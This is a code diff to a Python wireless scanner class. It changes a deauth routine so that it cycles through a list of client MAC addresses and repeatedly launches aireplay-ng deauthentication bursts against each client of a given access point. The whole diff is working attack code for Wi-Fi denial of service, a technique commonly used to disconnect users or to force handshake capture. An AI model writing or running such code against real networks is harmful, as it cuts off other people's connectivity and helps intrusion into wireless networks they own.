@@ -47,30 +47,30 @@ class scanner(object):
 				self.send_interrupt()	
 				break				
 
-	def deauth(self, essid='', bssid='', client_MAC='', conn=0):
-		cmd = ['aireplay-ng']
-		cmd.append('-b')		#bssid of AP
-		cmd.append(bssid)
-		cmd.append('-e')		#essid/name of AP
-		cmd.append(essid)
-		cmd.append('--deauth')	#number of deauth packets to send in one injection round
-		cmd.append('6')
-		cmd.append('-c')		#client target MAC address, better results than broadcast
-		cmd.append(client_MAC)
-		cmd.append(self.iface)	#wlan interface in monitor mode
-		print "Using command:", cmd
+	def deauth(self, essid='', bssid='', client_MAC=[], conn=0):
+		self.client_MAC_list = client_MAC
 		scanning = True
-		while True:
-			time.sleep(6)
-			if scanning == True:
-				self.proc = Popen(cmd)
+		while scanning == True:
+			for MAC in self.client_MAC_list:
+				if scanning == True:
+					cmd = ['aireplay-ng']
+					cmd.append('-b')		#bssid of AP
+					cmd.append(bssid)
+					cmd.append('-e')		#essid/name of AP
+					cmd.append(essid)
+					cmd.append('--deauth')	#number of deauth packets to send in one injection round
+					cmd.append('6')
+					cmd.append('-c')		#client target MAC address, better results than broadcast
+					cmd.append(MAC)
+					cmd.append(self.iface)
+					#print "Using command:", cmd  		#debug
+					self.proc = Popen(cmd)
+				time.sleep(6)
 				scanning = conn.recv()    
-				#print "deauth child scanning:", scanning		#debug
-			if scanning == False:
-				print "Attempting to terminate process deauth..."
-				self.send_interrupt()	
-				break	
-			
+				if scanning == False:
+					break
+					
+					
 
 ## Sends interrupt signal to process
 	def send_interrupt(self):
